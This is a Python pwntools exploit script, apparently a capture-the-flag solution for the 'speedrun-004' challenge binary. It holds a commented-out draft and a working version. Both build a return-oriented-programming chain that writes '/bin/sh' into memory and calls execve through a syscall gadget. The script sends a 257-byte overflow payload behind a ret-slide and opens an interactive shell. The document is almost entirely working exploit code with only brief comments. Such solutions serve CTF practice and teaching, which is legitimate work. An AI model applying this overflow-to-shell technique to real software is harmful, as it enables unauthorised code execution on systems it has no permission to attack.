# from pwn import *

# r = process("./speedrun-004")
# gdb.attach(r, api=True)

# payload = b""
# rop = b""

# popRax = p64(0x415f04)
# popRdi = p64(0x400686)
# popRsi = p64(0x410a93)
# popRdx = p64(0x44a155)
# syscall = p64(0x40132c)
# ret = p64(0x400416)

# # 0x000000000048d301 : mov qword ptr [rax], rdx ; ret
# mov = p64(0x48d301)

# addr_store = p64(0x6b6040)


# rop += popRdx + b"/bin/sh\x00"
# rop += popRax + addr_store
# rop += mov
# rop += popRax + p64(0x3b)
# rop += popRdi + addr_store
# rop += popRsi + p64(0)
# rop += popRdx + p64(0)
# rop += syscall

# r.sendline(b"257")
# r.recv()
# payload = ret*18 + rop + b"\x00"*6
# r.send(payload)

# r.interactive()

from pwn import *

target = process('./speedrun-004')
gdb.attach(target, api=True)

# Establish rop gadgets
popRax = p64(0x0000000000415f04)
popRdi = p64(0x0000000000400686)
popRsi = p64(0x0000000000410a93)
popRdx = p64(0x000000000044a155)

syscall = p64(0x000000000040132c)

ret = p64(0x0000000000400416)

# 0x000000000048d301 : mov qword ptr [rax], rdx ; ret
mov = p64(0x000000000048d301)

# bss adress we write to
bss = p64(0x00000000006b6030)

binsh = p64(0x0068732f6e69622f)

# Our Rop chain
# Checkout https://github.com/guyinatuxedo/ctf/tree/master/defconquals2019/speedrun/s1
# for more details on how to make it
rop = b""
rop += popRax
rop += bss
rop += popRdx
rop += binsh
rop += mov

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += bss

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall

# Make the payload
# Append the rop chain to after the ret gadget slide
# Overwrite least significant byte of saved base pointer with 0x00
payload = ret*19 + rop + b"\x00"

# Specify we are sending 257 bytes
target.sendline(b'257')

# Pause to ensure I/O purposes
# raw_input()
target.recv()
# Send the payload
target.send(payload)

target.interactive()
